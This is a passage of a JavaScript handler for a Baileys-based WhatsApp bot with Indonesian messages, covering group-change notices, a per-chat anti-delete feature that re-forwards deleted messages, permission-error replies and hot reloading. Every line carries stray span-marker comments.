 * @param {import('baileys').BaileysEventMap<unknown>['groups.update']} groupsUpdate
 */
export async function groupsUpdate(groupsUpdate) { //[span_378](start_span)[span_378](end_span)
	for (const groupUpdate of groupsUpdate) { //[span_379](start_span)[span_379](end_span)
		const id = groupUpdate.id; //[span_380](start_span)[span_380](end_span)
		if (!id) continue; //[span_381](start_span)[span_381](end_span)
		let chats = global.db.data.chats[id], //[span_382](start_span)[span_382](end_span)
			text = ''; //[span_383](start_span)[span_383](end_span)
		if (!chats?.detect) continue; //[span_384](start_span)[span_384](end_span)
		if (groupUpdate.desc) text = (chats.sDesc || this.sDesc || conn.sDesc || '```Description has been changed to```\n@desc').replace('@desc', groupUpdate.desc); //[span_385](start_span)[span_385](end_span)
		if (groupUpdate.subject) text = (chats.sSubject || this.sSubject || conn.sSubject || '```Subject has been changed to```\n@subject').replace('@subject', groupUpdate.subject); //[span_386](start_span)[span_386](end_span)
		if (groupUpdate.icon) text = (chats.sIcon || this.sIcon || conn.sIcon || '```Icon has been changed to```').replace('@icon', groupUpdate.icon); //[span_387](start_span)[span_387](end_span)
		if (groupUpdate.revoke) text = (chats.sRevoke || this.sRevoke || conn.sRevoke || '```Group link has been changed to```\n@revoke').replace('@revoke', groupUpdate.revoke); //[span_388](start_span)[span_388](end_span)
		if (!text) continue; //[span_389](start_span)[span_389](end_span)
		await this.sendMessage(id, { text, mentions: this.parseMention(text) }); //[span_390](start_span)[span_390](end_span)
	}
}

export async function deleteUpdate(message) { //[span_391](start_span)[span_391](end_span)
	try {
		if (!message) return; //[span_392](start_span)[span_392](end_span)

		const key = message.key || message; //[span_393](start_span)[span_393](end_span)
		const fromMe = key.fromMe || message.fromMe; //[span_394](start_span)[span_394](end_span)
		const id = key.id || message.id; //[span_395](start_span)[span_395](end_span)
		const participant = key.participant || message.participant || key.remoteJid || message.remoteJid; //[span_396](start_span)[span_396](end_span)
		const remoteJid = key.remoteJid || message.remoteJid || message.chat; //[span_397](start_span)[span_397](end_span)

		if (fromMe || !id) return; //[span_398](start_span)[span_398](end_span)

		let stored = null; //[span_399](start_span)[span_399](end_span)
		try {
			stored = this.loadMessage(id); //[span_400](start_span)[span_400](end_span)
		} catch {}

		if (!stored && remoteJid) { //[span_401](start_span)[span_401](end_span)
			try {
				stored = this.loadMessage(remoteJid, id); //[span_402](start_span)[span_402](end_span)
			} catch {}
		}

		if (!stored) return; //[span_403](start_span)[span_403](end_span)

		let msg = null; //[span_404](start_span)[span_404](end_span)
		try {
			msg = this.serializeM(stored); //[span_405](start_span)[span_405](end_span)
		} catch {
			msg = stored; //[span_406](start_span)[span_406](end_span)
		}

		if (!msg || !msg.chat) return; //[span_407](start_span)[span_407](end_span)

		const chat = global.db?.data?.chats?.[msg.chat]; //[span_408](start_span)[span_408](end_span)
		if (!chat?.delete) return; //[span_409](start_span)[span_409](end_span)

		const user = participant || msg.sender || msg.key?.participant || msg.key?.remoteJid || ''; //[span_410](start_span)[span_410](end_span)
		const mention = user && user.includes('@') ? user : null; //[span_411](start_span)[span_411](end_span)
		const number = mention ? mention.split('@')[0] : 'seseorang'; //[span_412](start_span)[span_412](end_span)

		await this.reply( //[span_413](start_span)[span_413](end_span)
			msg.chat, //[span_414](start_span)[span_414](end_span)
			`
Terdeteksi @${number} telah menghapus pesan.

Untuk mematikan fitur ini, ketik:
*.disable delete*
`.trim(), //[span_415](start_span)[span_415](end_span)
			msg, //[span_416](start_span)[span_416](end_span)
			{
				mentions: mention ? [mention] : [], //[span_417](start_span)[span_417](end_span)
			}
		);

		await this.copyNForward(msg.chat, msg).catch((e) => console.log('COPY DELETED MESSAGE ERROR:', e)); //[span_418](start_span)[span_418](end_span)
	} catch (e) {
		console.error('deleteUpdate error:', e); //[span_419](start_span)[span_419](end_span)
	}
}

global.dfail = (type, m, conn) => { //[span_420](start_span)[span_420](end_span)
	let msg = { //[span_421](start_span)[span_421](end_span)
		rowner: 'Only Developer - Command ini hanya untuk developer bot', //[span_422](start_span)[span_422](end_span)
		owner: 'Only Owner - Command ini hanya untuk owner bot', //[span_423](start_span)[span_423](end_span)
		premium: 'Only Premium - Command ini hanya untuk pengguna premium', //[span_424](start_span)[span_424](end_span)
		group: 'Group Chat - Command ini hanya bisa dipakai di dalam grup', //[span_425](start_span)[span_425](end_span)
		private: 'Private Chat - Command ini hanya bisa dipakai di private chat', //[span_426](start_span)[span_426](end_span)
		admin: 'Only Admin - Command ini hanya untuk admin grup', //[span_427](start_span)[span_427](end_span)
		botAdmin: 'Only Bot Admin - Command ini hanya bisa digunakan ketika bot menjadi admin', //[span_428](start_span)[span_428](end_span)
		unreg: 'Halo kak! 👋 Anda harus mendaftar ke database bot dulu sebelum menggunakan fitur ini\nCara daftarnya tulis .daftar Nama.umur', //[span_429](start_span)[span_429](end_span)
		restrict: 'Restrict - Fitur restrict belum diaktifkan di chat ini', //[span_430](start_span)[span_430](end_span)
	}[type]; //[span_431](start_span)[span_431](end_span)
	if (msg) return conn.reply(m.chat, msg, m); //[span_432](start_span)[span_432](end_span)
};

let file = global.__filename(import.meta.url, true); //[span_433](start_span)[span_433](end_span)
watchFile(file, async () => { //[span_434](start_span)[span_434](end_span)
	unwatchFile(file); //[span_435](start_span)[span_435](end_span)
	console.log(chalk.redBright("Update 'handler.js'")); //[span_436](start_span)[span_436](end_span)
	if (global.reloadHandler) console.log(await global.reloadHandler()); //[span_437](start_span)[span_437](end_span)
}); //[span_438](start_span)[span_438](end_span)
